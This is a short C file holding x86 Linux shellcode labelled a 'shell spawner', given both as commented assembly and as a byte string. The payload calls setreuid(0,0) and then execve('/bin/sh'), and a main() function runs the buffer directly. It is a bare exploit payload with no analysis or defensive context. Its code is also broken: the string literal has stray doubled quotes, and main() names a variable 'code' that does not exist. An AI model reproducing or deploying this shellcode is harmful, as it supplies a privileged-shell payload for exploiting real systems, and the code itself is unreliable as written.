//Basic Shell spawner shellcode
//
//_start:
//        xor eax, eax
//        mov al, 70            
//        xor ebx, ebx
//        xor ecx, ecx
//        int 0x80
//
//        jmp short ender
//
//        starter:
//
//        pop ebx               
//        xor eax, eax
//
//        mov [ebx+7 ], al        
//        mov [ebx+8 ], ebx       
//                                
//        mov [ebx+12], eax       
//        mov al, 11            
//        lea ecx, [ebx+8]       
//        lea edx, [ebx+12]       
//        int 0x80               
//
//        ender:
//        call starter
//        db '/bin/shNAAAABBBB'

char c[] = ""\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
	      "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\
	      "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
	      "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
	      "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";";
int main(int argc, char **argv)
{
  int (*f)();
  f = (int (*)()) code;
  (int)(*f)();
}
